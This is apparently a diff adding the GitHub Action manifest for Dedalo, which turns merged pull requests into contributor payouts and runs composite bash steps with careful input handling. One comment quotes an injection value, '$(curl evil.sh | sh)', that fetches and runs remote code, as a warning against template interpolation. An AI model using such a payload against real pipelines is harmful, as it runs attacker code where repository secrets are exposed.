@@ -1,0 +1,166 @@
+name: Dedalo
+description: Turn merged pull requests into contributor payouts, from your own pipeline
+author: Dedalo contributors
+
+branding:
+  icon: git-merge
+  color: purple
+
+inputs:
+  version:
+    description: "Release to use, e.g. v0.1.0. Defaults to the latest release."
+    required: false
+    default: latest
+  command:
+    description: "Subcommand to run: status, scan, contributors, plan or settle."
+    required: false
+    default: status
+  amount:
+    description: "Size of the round, for `plan` and `settle`, in the configured asset."
+    required: false
+    default: ""
+  since:
+    description: "Start after this revision instead of the last settled commit."
+    required: false
+    default: ""
+  execute:
+    description: >
+      Broadcast for real instead of simulating. Requires the signing key in the
+      environment variable named by `settlement.signer_env`. Defaults to false,
+      because the safe thing must be the default.
+    required: false
+    default: "false"
+  working-directory:
+    description: "Repository to operate on."
+    required: false
+    default: "."
+  summary:
+    description: "Write the payout plan to the workflow run summary."
+    required: false
+    default: "true"
+
+outputs:
+  json:
+    description: "Raw JSON output of the command."
+    value: ${{ steps.run.outputs.json }}
+  plan-id:
+    description: "Content hash of the payout plan, when the command produced one."
+    value: ${{ steps.run.outputs.plan-id }}
+  total:
+    description: "Total that would move, in base units."
+    value: ${{ steps.run.outputs.total }}
+
+runs:
+  using: composite
+  steps:
+    # Inputs reach the shell through the environment, never through template
+    # expansion. This Action runs in other people's repositories with their
+    # secrets in scope: an `amount` of `$(curl evil.sh | sh)` interpolated into
+    # a run block would execute.
+    - name: Check out history if the caller has not
+      shell: bash
+      working-directory: ${{ inputs.working-directory }}
+      run: |
+        set -euo pipefail
+        # Attribution reads merge history: a shallow clone silently produces
+        # an empty round rather than an error.
+        if [ "$(git rev-parse --is-shallow-repository 2>/dev/null)" = "true" ]; then
+          echo "::warning title=Shallow clone::dedalo needs full history; fetching it now. Set fetch-depth: 0 on actions/checkout to avoid this."
+          git fetch --unshallow --quiet || true
+        fi
+
+    - name: Install dedalo
+      shell: bash
+      env:
+        VERSION: ${{ inputs.version }}
+        ACTION_PATH: ${{ github.action_path }}
+      run: |
+        set -euo pipefail
+        # install.sh resolves the latest release when DEDALO_VERSION is unset.
+        # Expressing that as `version == 'latest' && '' || version` does not
+        # work: '' is falsy, so the fallback fires and the literal string
+        # "latest" is used as a version.
+        if [ "$VERSION" != "latest" ] && [ -n "$VERSION" ]; then
+          export DEDALO_VERSION="$VERSION"
+        fi
+        # Installed under RUNNER_TEMP and invoked by absolute path. Writing to
+        # $GITHUB_PATH would change how every later step in the caller's job
+        # resolves commands, which is more authority than this Action needs.
+        export DEDALO_INSTALL="${RUNNER_TEMP}/dedalo-bin"
+        "${ACTION_PATH}/install.sh"
+
+    - name: Run dedalo
+      id: run
+      shell: bash
+      working-directory: ${{ inputs.working-directory }}
+      env:
+        COMMAND: ${{ inputs.command }}
+        AMOUNT: ${{ inputs.amount }}
+        SINCE: ${{ inputs.since }}
+        EXECUTE: ${{ inputs.execute }}
+      run: |
+        set -euo pipefail
+        dedalo="${RUNNER_TEMP}/dedalo-bin/dedalo"
+
+        case "$COMMAND" in
+          status|scan|contributors|plan|settle|ledger) ;;
+          *)
+            echo "::error title=Invalid input::command must be one of status, scan, contributors, plan, settle, ledger (got '$COMMAND')"
+            exit 1
+            ;;
+        esac
+
+        args=("$COMMAND")
+        if [ -n "$AMOUNT" ]; then
+          args+=(--amount "$AMOUNT")
+        fi
+        if [ -n "$SINCE" ]; then
+          args+=(--since "$SINCE")
+        fi
+        if [ "$EXECUTE" = "true" ]; then
+          if [ "$COMMAND" != "settle" ]; then
+            echo "::error title=Invalid input::execute: true only applies to the settle command"
+            exit 1
+          fi
+          args+=(--execute)
+        fi
+
+        # `settle` has side effects, so it runs exactly once and only in JSON
+        # form. The read-only commands can afford a second, prettier pass.
+        if [ "$COMMAND" != "settle" ]; then
+          "$dedalo" "${args[@]}" | tee "${RUNNER_TEMP}/dedalo-human.txt"
+        fi
+
+        json=$("$dedalo" --json "${args[@]}")
+        printf '%s\n' "$json"
+
+        {
+          echo "json<<DEDALO_EOF"
+          printf '%s\n' "$json"
+          echo "DEDALO_EOF"
+        } >> "$GITHUB_OUTPUT"
+
+        plan_id=$(printf '%s' "$json" | grep -o '"id": *"[^"]*"' | head -1 | cut -d'"' -f4 || true)
+        total=$(printf '%s' "$json" | grep -o '"gross": *"[^"]*"' | head -1 | cut -d'"' -f4 || true)
+        printf 'plan-id=%s\n' "$plan_id" >> "$GITHUB_OUTPUT"
+        printf 'total=%s\n' "$total" >> "$GITHUB_OUTPUT"
+
+    - name: Write the result to the run summary
+      if: inputs.summary == 'true'
+      shell: bash
+      env:
+        COMMAND: ${{ inputs.command }}
+        DEDALO_JSON: ${{ steps.run.outputs.json }}
+      run: |
+        set -euo pipefail
+        {
+          printf '## Dedalo — %s\n\n' "$COMMAND"
+          echo '```'
+          # Reuse what already ran: never invoke the command a second time.
+          if [ -s "${RUNNER_TEMP}/dedalo-human.txt" ]; then
+            cat "${RUNNER_TEMP}/dedalo-human.txt"
+          else
+            printf '%s\n' "$DEDALO_JSON"
+          fi
+          echo '```'
+        } >> "$GITHUB_STEP_SUMMARY"
